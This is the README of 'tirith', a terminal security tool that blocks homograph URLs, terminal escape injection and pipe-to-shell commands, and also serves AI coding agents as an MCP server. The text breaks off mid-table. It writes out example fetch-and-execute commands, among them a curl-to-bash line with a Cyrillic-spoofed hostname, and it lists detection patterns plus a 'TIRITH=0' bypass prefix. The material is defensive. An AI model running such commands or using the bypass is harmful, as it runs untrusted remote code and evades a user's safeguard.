# tirith

**Your browser would catch this. Your terminal won't.**

<p align="center">
  <img src="assets/cover.png" alt="tirith — terminal security" width="100%" />
</p>

[![CI](https://github.com/sheeki03/tirith/actions/workflows/ci.yml/badge.svg)](https://github.com/sheeki03/tirith/actions/workflows/ci.yml)
[![GitHub Stars](https://img.shields.io/github/stars/sheeki03/tirith?style=flat&logo=github)](https://github.com/sheeki03/tirith/stargazers)
[![License: AGPL-3.0](https://img.shields.io/badge/license-AGPL--3.0-blue)](LICENSE-AGPL)

[Website](https://tirith.sh) | [Docs](https://tirith.sh/docs) | [Changelog](https://github.com/sheeki03/tirith/releases)

---

Can you spot the difference?

```
  curl -sSL https://install.example-cli.dev | bash     # safe
  curl -sSL https://іnstall.example-clі.dev | bash     # compromised
```

You can't. Neither can your terminal. Both `і` characters are Cyrillic (U+0456), not Latin `i`. The second URL resolves to an attacker's server. The script executes before you notice.

Browsers solved this years ago. Terminals still render Unicode, ANSI escapes, and invisible characters without question.

**Tirith stands at the gate.**

```bash
brew install sheeki03/tap/tirith
```

Then activate in your shell profile:

```bash
# zsh
eval "$(tirith init --shell zsh)"

# bash
eval "$(tirith init --shell bash)"

# fish
tirith init --shell fish | source
```

That's it. Every command you run is now guarded. Zero friction on clean input. Sub-millisecond overhead. You forget it's there until it saves you.

Also available via [npm](#cross-platform), [cargo](#cross-platform), [mise](#cross-platform), [apt/dnf](#linux-packages), and [more](#install).

---

## See it work

**Homograph attack — blocked before execution:**

```
$ curl -sSL https://іnstall.example-clі.dev | bash

tirith: BLOCKED
  [CRITICAL] non_ascii_hostname — Cyrillic і (U+0456) in hostname
    This is a homograph attack. The URL visually mimics a legitimate
    domain but resolves to a completely different server.
  Bypass: prefix your command with TIRITH=0 (applies to that command only)
```

The command never executes.

**Pipe-to-shell with clean URL — warned, not blocked:**

```
$ curl -fsSL https://get.docker.com | sh

tirith: WARNING
  [MEDIUM] pipe_to_interpreter — Download piped to interpreter
    Consider downloading first and reviewing.
```

Warning prints to stderr. Command still runs.

**Normal commands — invisible:**

```
$ git status
$ ls -la
$ docker compose up -d
```

Nothing. Zero output. You forget tirith is running.

---

## What it catches

**66 detection rules across 11 categories.**

| Category | What it stops |
|----------|--------------|
| **Homograph attacks** | Cyrillic/Greek lookalikes in hostnames, punycode domains, mixed-script labels, lookalike TLDs, confusable domains |
| **Terminal injection** | ANSI escape sequences, bidi overrides, zero-width characters, unicode tags, invisible math operators, variation selectors |
| **Pipe-to-shell** | `curl \| bash`, `wget \| sh`, `httpie \| sh`, `xh \| sh`, `python <(curl ...)`, `eval $(wget ...)` — every source-to-sink pattern |
| **Command safety** | Dotfile overwrites, archive extraction to sensitive paths, cloud metadata endpoint access, private network access |
| **Insecure transport** | Plain HTTP piped to shell, `curl -k`, disabled TLS verification, shortened URLs hiding destinations |
| **Environment** | Proxy hijacking, sensitive env exports, code injection via env, interpreter hijack, shell injection env |
| **Config file security** | Config injection, suspicious indicators, non-ASCII/invisible unicode in configs, MCP server security (insecure/untrusted/duplicate/permissive) |
| **Ecosystem threats** | Git clone typosquats, untrusted Docker registries, pip/npm URL installs, web3 RPC endpoints, vet-not-configured |
| **Path analysis** | Non-ASCII paths, homoglyphs in paths, double-encoding |
| **Rendered content** | Hidden CSS/color content, hidden HTML attributes, markdown/HTML comments with instructions |
| **Cloaking detection** | Server-side cloaking (bot vs browser), clipboard hidden content, PDF hidden text |

---

## AI agent security

Tirith protects AI coding agents at every layer — from the configs they read to the commands they execute.

### MCP server (7 tools)

Run `tirith mcp-server` or use `tirith setup <tool> --with-mcp` to register tirith as an MCP server. AI agents can call these tools before taking action:

| Tool | What it does |
|------|-------------|
| `tirith_check_command` | Analyze shell commands for pipe-to-shell, homograph URLs, env injection |
| `tirith_check_url` | Score URLs for homograph attacks, punycode tricks, shortened URLs, raw IPs |
| `tirith_check_paste` | Check pasted content for ANSI escapes, bidi controls, zero-width chars |
| `tirith_scan_file` | Scan a file for hidden content, invisible Unicode, config poisoning |
| `tirith_scan_directory` | Recursive scan with AI config file prioritization |
| `tirith_verif